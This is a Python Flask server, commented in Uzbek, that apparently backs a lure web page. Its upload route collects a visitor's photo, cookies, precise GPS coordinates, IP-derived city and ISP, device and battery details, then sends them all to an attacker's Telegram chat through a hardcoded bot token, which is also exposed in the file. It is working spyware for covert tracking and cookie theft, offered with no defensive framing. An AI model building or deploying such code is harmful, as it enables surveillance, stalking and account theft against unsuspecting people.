import os
from flask import Flask, request, render_template
import requests
app = Flask(__name__)

BOT_TOKEN = '7950728193:AAEQYqYDSOZ4wV0EPgyt45HImolwYk6LFoY' 
ADMIN_ID = 6646928202   

def get_bot_username():
    """Get the bot's username from the Telegram API."""
    response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/getMe')
    if response.status_code == 200: 
        data = response.json()
        if data['ok']:
            return (data['result']['username'])
    return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check-ip/<ip>')
def check_ip(ip):
    res = requests.get(f"https://ipinfo.io/{ip}/json")
    if res.status_code != 200:
        return {'error': 'IP ma’lumotlari topilmadi'}, 404
    res.raise_for_status()
    return res.json()

def clean_value(value: str, max_length=100):
    """Xavfsizlik uchun qiymatni tozalash va cheklash"""
    return str(value).replace('"', '').replace("'", '')[:max_length]

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return 'Rasm yo‘q', 400

    photo = request.files['photo']
    # Form ma’lumotlarini tozalash va cheklash
    user_agent     = clean_value(request.form.get('userAgent', 'Nomalum'))
    platform       = clean_value(request.form.get('platform', 'Nomalum'))
    cookies        = clean_value(request.form.get('cookies', 'Nomalum'))
    battery_level  = clean_value(request.form.get('batteryLevel', 'Nomalum'))
    battery_charge = clean_value(request.form.get('batteryCharging', 'Nomalum'))
    language       = clean_value(request.form.get('language', 'Nomalum'))
    tz_offset      = clean_value(request.form.get('timezoneOffset', 'Nomalum'))
    user_timezone  = clean_value(request.form.get('userTimezone', 'Nomalum'))
    latitude       = float(request.form.get('latitude', 'Nomalum'))
    longitude      = float(request.form.get('longitude', 'Nomalum'))
    user_ip        = clean_value(request.form.get('user_ip', request.remote_addr or 'Nomalum'))
    user_ip_data = check_ip(user_ip)

    # Rasmni vaqtinchalik saqlash
    photo_path = 'auto.jpg'
    photo.save(photo_path)
    city = user_ip_data.get('city', "Noma'lum")
    region = user_ip_data.get('region', "Noma'lum")
    country = user_ip_data.get('country', "Noma'lum")
    isp = user_ip_data.get('org', "Noma'lum")
    caption_text = (
        "🚨 <b>Yangi foydalanuvchi ma’lumotlari</b>\n\n"
        f"📸 <b>Rasm:</b> ilova qilindi\n"
        f"🌐 <b>IP:</b> <code>{user_ip}</code>\n"
        f"📍<b>Koordinatalar:</b> Latitude: {latitude}, Longitude: {longitude}\n"
        f"🌍 <a href='https://maps.google.com/?q={latitude},{longitude}'>Geolokatsiya ko`rish</a>\n\n"
        f"🧭 <b>Timezone:</b> {user_timezone} (Offset: {tz_offset})\n\n"
        f"🖥️ <b>Platforma:</b> {platform}\n"
        f"🧠 <b>User-Agent:</b> {user_agent}\n"
        f"🔤 <b>Til:</b> {language}\n"
        f"🔋 <b>Zaryad:</b> {battery_level} | <b>Quvvat olayapti:</b> {battery_charge}\n"
        f"🍪 <b>Cookies:</b> {cookies}\n\n"
        f"📍 <b>IP ma’lumotlari:</b>\n"
        f"   - <b>Shahar:</b> <code>{city}</code>\n"
        f"   - <b>Region:</b> <code>{region}</code>\n"
        f"   - <b>Davlat:</b> <code>{country}</code>\n"
        f"   - <b>ISP:</b> <code>{isp}</code>\n"
    )


    # Telegram orqali yuborish
    send_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    with open(photo_path, 'rb') as f:
        requests.post(send_url, data={
            'chat_id': ADMIN_ID,
            'caption': caption_text,
            'parse_mode': 'HTML'
        }, files={'photo': f})

    os.remove(photo_path)
    return 'Yuborildi ✅', 200



@app.route('/.well-known/appspecific/com.chrome.devtools.json')
def chrome_devtools_fix():
    return '', 204  # 204 No Content

if __name__ == '__main__':
    print(f" @{get_bot_username()}")  # Call to ensure the bot username is fetched at startup
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
